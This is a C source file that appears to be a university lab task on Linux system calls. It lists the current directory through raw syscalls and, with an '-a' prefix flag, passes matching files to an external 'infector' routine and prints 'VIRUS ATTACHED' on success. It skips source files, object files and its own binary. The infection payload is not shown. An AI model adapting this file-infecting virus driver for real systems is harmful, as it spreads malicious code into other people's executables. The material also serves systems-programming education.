#include "util.h"

#define SYS_GETDENTS 141
#define STDOUT 1
#define STDERR 2
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6

extern int system_call();
extern void infection(void);
extern int infector(char *);  /* Now returns int */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char          d_name[256];
};

void print_name(char* name, int virus_attached) {
    system_call(SYS_WRITE, STDOUT, name, strlen(name));
    if (virus_attached) {
        system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
    }
    system_call(SYS_WRITE, STDOUT, "\n", 1);
}

/* Returns 1 if the file should be ignored, 0 otherwise */
int should_ignore_file(char* filename) {
    /* Skip . and .. */
    if (strcmp(filename, ".") == 0 || strcmp(filename, "..") == 0)
        return 1;
    
    /* Skip executables and special files */
    if (strcmp(filename, "task2") == 0 || 
        strcmp(filename, "makefile") == 0)
        return 1;
        
    /* Skip source and object files */
    int len = strlen(filename);
    if (len > 2) {
        if (strcmp(filename + len - 2, ".c") == 0 ||
            strcmp(filename + len - 2, ".s") == 0 ||
            strcmp(filename + len - 2, ".h") == 0 ||
            strcmp(filename + len - 2, ".o") == 0)
            return 1;
    }
    
    return 0;
}

int main(int argc, char* argv[]) {
    char* prefix = 0;
    char buf[8192];
    int fd, nread;
    struct linux_dirent *d;
    int bpos;
    
    /* Parse command line for -a flag */
    int i;
    for(i = 1; i < argc; i++) {
        if(argv[i][0] == '-' && argv[i][1] == 'a') {
            prefix = &argv[i][2];
            break;
        }
    }
    
    /* Open current directory */
    fd = system_call(SYS_OPEN, ".", 0, 0);
    if (fd < 0) {
        return 0x55;
    }
    
    /* Read directory entries */
    nread = system_call(SYS_GETDENTS, fd, buf, 8192);
    if (nread < 0) {
        return 0x55;
    }
    
    /* Process directory entries */
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *) (buf + bpos);
        
        if (!should_ignore_file(d->d_name)) {
            if (prefix && d->d_name[0] == prefix[0]) {
                /* Try to infect and only print VIRUS ATTACHED if successful */
                if (infector(d->d_name) == 1) {
                    print_name(d->d_name, 1);
                } else {
                    print_name(d->d_name, 0);
                }
            } else {
                print_name(d->d_name, 0);
            }
        }
        
        bpos += d->d_reclen;
    }
    
    /* Close directory */
    system_call(SYS_CLOSE, fd);
    return 0;
}